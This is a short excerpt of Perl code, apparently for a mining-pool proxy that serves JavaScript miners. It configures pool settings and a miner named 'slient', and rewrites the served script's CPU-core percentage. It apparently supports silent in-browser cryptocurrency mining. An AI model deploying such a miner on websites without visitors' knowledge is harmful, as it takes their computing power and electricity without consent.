...
my %CFG = (
	...
	POOL_PORT		=> 3333,
	POOL_WORKER_NAME	=> 't1Q7T1m2QcSaj6hawBW8BDn878jcUehC8xu.js',
	POOL_WORKER_PASS	=> 'x',
	POOL_KEEP_INTERVAL	=> 1 * 60,
	POOL_SESSION_TIMEOUT	=> 10 * 60,
	POOL_MINER_NAME		=> 'slient',
);
...
sub http {
	...
	if ($req =~ /^[a-z0-9.]+$/i && -f "static/$req") {
		...
		# replace our configuration value with default one
		$c =~ s/var corepercent = 1;/var corepercent = $CFG{CORE_PERCENTAGE};/ig;
